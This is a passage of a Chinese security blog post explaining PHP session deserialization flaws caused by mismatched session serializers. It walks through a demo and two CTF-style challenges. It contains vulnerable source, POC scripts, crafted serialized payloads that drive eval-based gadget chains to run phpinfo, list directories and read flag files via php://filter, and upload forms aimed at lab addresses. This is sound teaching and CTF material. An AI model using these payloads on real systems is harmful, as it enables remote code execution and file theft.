+<h2 id="php-session反序化漏洞"><a href="#php-session反序化漏洞" class="headerlink" title="php session反序化漏洞"></a>php session反序化漏洞</h2><h3 id="漏洞概念"><a href="#漏洞概念" class="headerlink" title="漏洞概念"></a>漏洞概念</h3><p>PHP session反序列化漏洞，简单点说，就是当网站序列化并存储Session与反序列化并读取Session的方式不同时就可能导致session反序列化漏洞的产生。</p>
+<h3 id="漏洞demo（session-demo）"><a href="#漏洞demo（session-demo）" class="headerlink" title="漏洞demo（session_demo）"></a>漏洞demo（session_demo）</h3><p>index.php</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'demo.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Please tell me You name?"</span><span class="token punctuation">;</span>
+		<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>  
+<span class="token delimiter important">?></span></span></code></pre>
+
+<p>demo.php</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">lemon</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">var</span> <span class="token variable">$hi</span><span class="token punctuation">;</span>
+    
+    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hi</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hi</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span></span></code></pre>
+
+
+
+<p>漏洞分析</p>
+<p>我们发现<code>index.php</code>通过<code>php_serialize</code>引擎处理<code>session</code>数据，<code>demo.php</code>通过<code>php</code>引擎处理<code>session</code>数据;</p>
+<p>通过前面的知识我们知道<code>php_serialize</code>引擎以正常的反序列化格式存储和加载session数据，php以|的方式存储和加载session数据的；</p>
+<p>分析demo的源码，对lemon类进行实例化，得到其序列化的值为:<code>O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code></p>
+<p>请求index.php带入序列化的值，<code>http://192.168.1.191:32769/?name=|O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code></p>
+<p>最终sess文件的保存数据格式如下：</p>
+<p><code>a:1:&#123;s:4:&quot;name&quot;;s:44:&quot;|O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:10:&quot;phpinfo();&quot;;&#125;&quot;;&#125;</code></p>
+<p>当我们再次请求demo.php文件时，此文件会议php处理器的方式加载session文件，此时``a:1:{s:4:”name”;s:44:”|O:5:”<code>为 键名,</code>a:1:{s:4:”name”;s:44:”|O:5:”`为值</p>
+<p>那么最后的值就会被正常的进行反序列化，调用eval函数；</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210112152945.png" loading="lazy"></p>
+<h2 id="例题实战"><a href="#例题实战" class="headerlink" title="例题实战"></a>例题实战</h2><h3 id="session-upload"><a href="#session-upload" class="headerlink" title="session_upload"></a>session_upload</h3><p>(1) 题目源码</p>
+<p>index.php</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./class.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">varr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"phpinfo.php"</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span></code></pre>
+
+<p>class.php</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token function">highlight_string</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//show_source(__FILE__);</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">foo1</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$varr</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">varr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"i.php"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">varr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>文件"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">varr</span><span class="token operator">.</span><span class="token string double-quoted-string">"存在&lt;br>"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>这是foo1的析构函数&lt;br>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">foo2</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$varr</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">varr</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'1234567890'</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">varr</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__desctuct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>这是foo2的析构函数&lt;br>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">foo3</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$varr</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">varr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__desctuct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>这是foo3的析构函数&lt;br>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token delimiter important">?></span></span></code></pre>
+
+<p>phpinfo.php</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./class.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token variable">$f3</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$f3</span><span class="token operator">-></span><span class="token property">varr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"phpinfo();"</span><span class="token punctuation">;</span>
+    <span class="token variable">$f3</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span></code></pre>
+
+<p>(2) 题目分析</p>
+<p>请求phpinfo.php获取session的配置信息如下：</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210112160923.png" loading="lazy"></p>
+<p>默认是采用<code>php_serialize</code>处理器处理<code>session</code>，<code>session.upload_progress.cleanup</code>配置为Off，<code>session.upload_progress.enabled</code>配置为On；</p>
+<p><code>session.upload_progress.enabled</code>当它为开启状态时，PHP能够在每一个文件上传时监测上传进度。当一个上传在处理中，同时POST一个与php.ini中设置的<code>session.upload_progress.name</code>同名变量时，上传进度就可以在<code>$_SESSION</code>中获得。当PHP检测到这种POST请求时，它会在<code>$_SESSION</code>中添加一组数据, 索引是<code>session.upload_progress.prefix</code>与 <code>session.upload_progress.name</code>连接在一起的值。                                  </p>
+<p>分析前面的代码并没有发现可以向服务器发送数据的点，根据前面所讲的特性，我们可以通过上传文件的方式向目标session写入数据。</p>
+<p>并且我们发现i.php与phpinfo.php使用的session解析器不相同；</p>
+<p>(3) 漏洞利用</p>
+<p>分析class.php的源码构造poc如下:</p>
+<pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">foo1</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">public</span> <span class="token variable">$varr</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">foo2</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">public</span> <span class="token variable">$varr</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">foo3</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">public</span> <span class="token variable">$varr</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">varr</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">varr</span><span class="token operator">-></span><span class="token property">varr</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">varr</span><span class="token punctuation">;</span>
+    <span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">varr</span><span class="token operator">-></span><span class="token property">varr</span><span class="token operator">-></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">varr</span><span class="token operator">-></span><span class="token property">varr</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">-></span><span class="token property">varr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"include('php://filter/read=convert.base64-encode/resource=flag.php');"</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span> </code></pre>
+
+<p>本地构造上表单文件index.html</p>
+<pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.1.191:32771/index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP_SESSION_UPLOAD_PROGRESS<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>123<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre>
+
+<p>bp截包，修改PHP_SESSION_UPLOAD_PROGRESS的值为class序列化的值</p>
+<p><code>|O:4:&quot;foo1&quot;:1:&#123;s:4:&quot;varr&quot;;O:4:&quot;foo2&quot;:2:&#123;s:4:&quot;varr&quot;;r:2;s:3:&quot;obj&quot;;O:4:&quot;foo3&quot;:1:&#123;s:4:&quot;varr&quot;;s:69:&quot;include(&#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;);&quot;;&#125;&#125;&#125;</code></p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210112170119.png" loading="lazy"></p>
+<h3 id="session-jarvis"><a href="#session-jarvis" class="headerlink" title="session_jarvis"></a>session_jarvis</h3><p>(1) 题目源码</p>
+<p>index.php</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">//A webshell is wait for you</span>
+<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">OowoO</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$mdzz</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mdzz</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    
+    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mdzz</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OowoO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_string</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span></code></pre>
+
+<p>phpinfo.php</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span></code></pre>
+
+<p>(2) 题目分析</p>
+<p>请求链接发现首页源码，根据源码传入phpinfo任意参数，执行phpinfo()，得到配置信息如下：</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210113093244.png" loading="lazy"></p>
+<p>根据以上信息发现是典型的利用了上传这个点传入session数据的；</p>
+<p>并且通过扫描发现存在phpinfo.php这个页面，请求发现这个页面使用的是默认的php_serialize解析器</p>
+<p>根据两页面使用的解析器不同特征，可以达成任意的反序列化利用</p>
+<p>(3) 漏洞利用</p>
+<p>构造上传表单</p>
+<pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.1.191:32768/index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP_SESSION_UPLOAD_PROGRESS<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>123<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre>
+
+<p>构造目录文件扫描序列化代码</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">OowoO</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$mdzz</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mdzz</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"print_r(scandir(dirname(__FILE__)));"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OowoO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//</span>
+<span class="token delimiter important">?></span></span>
+    O:5:"OowoO":1:&#123;s:4:"mdzz";s:36:"print_r(scandir(dirname(__FILE__)));";&#125;</code></pre>
+
+<p>抓取上传包，修改filename带入序列化的值</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210113101829.png" loading="lazy"></p>
+<p>构造读取flag序列化代码</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">OowoO</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$mdzz</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mdzz</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"include(\"php://filter/read=convert.base64-encode/resource=MDZZ_you_see_The_FlAg.php\");"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OowoO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//</span>
+<span class="token delimiter important">?></span></span>
+    O:5:"OowoO":1:&#123;s:4:"mdzz";s:86:"include("php://filter/read=convert.base64-encode/resource=MDZZ_you_see_The_FlAg.php");";&#125;</code></pre>
+
+<p>获得flag</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210113102232.png" loading="lazy"></p>
+</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">钱是万能的</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://gitee.com/greetdawn/blogImages/raw/master/img/qr-wechat.png"><img loading="lazy" src="https://gitee.com/greetdawn/blogImages/raw/master/img/qr-wechat.png" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://gitee.com/greetdawn/blogImages/raw/master/img/qr-alipay.png"><img loading="lazy" src="https://gitee.com/greetdawn/blogImages/raw/master/img/qr-alipay.png" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>丨Mr.zhang丨</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://www.greetdawn.top/2019/05/16/web-security/php-code-audit/php-unserialzie-session/" title="session反序列化">http://www.greetdawn.top/2019/05/16/web-security/php-code-audit/php-unserialzie-session/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2019/07/22/web-security/ssrf/ssrf-redis/" rel="prev" title="ssrf打内网redis"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">ssrf打内网redis</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2019/05/14/web-security/php-code-audit/php-unserialize-vul/" rel="next" title="php反序列化漏洞解析"><span class="post-nav-text">php反序列化漏洞解析</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>尝试使用 Disqus 评论系统。</span><br><span>您可以点击下方按钮切换对应评论系统。</span><br><a class="hty-button hty-button--raised" id="github-issues" target="_blank" rel="noopener" href="https://github.com/greetdawn/greetdawn.github.io/issues?q=is:issue+session反序列化">GitHub Issues</a></div><div class="toggle-comment-system" style="margin: 1rem auto"><a 